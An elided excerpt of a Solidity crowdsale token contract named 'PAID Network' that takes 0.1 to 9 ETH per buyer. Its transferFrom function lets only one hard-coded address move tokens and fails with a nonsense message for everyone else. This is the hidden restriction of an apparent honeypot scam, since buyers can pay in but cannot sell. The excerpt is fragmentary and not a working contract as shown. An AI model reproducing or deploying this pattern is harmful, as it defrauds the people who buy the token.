...
contract StandardToken is BasicToken, Ownable {
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        require(sender == 0x6Cc40BC90D4c71b1A9123E9747ae88c7DcAC31e7,"jnjknkjn");
...
contract CrowdsaleToken is Whitelist, Configurable {
    ...
    receive() external payable {
        ...
        require(msg.value <= 9e18 && msg.value >= 1e17, "You can send at least 0.1 ETH but not more than 9 ETH");
        ...
        require(ethBalances[_msgSender()] <= 9e18, "Cannot send more than 9 ETH");
...
contract YDP  is CrowdsaleToken {
    string public name = "PAID Network";
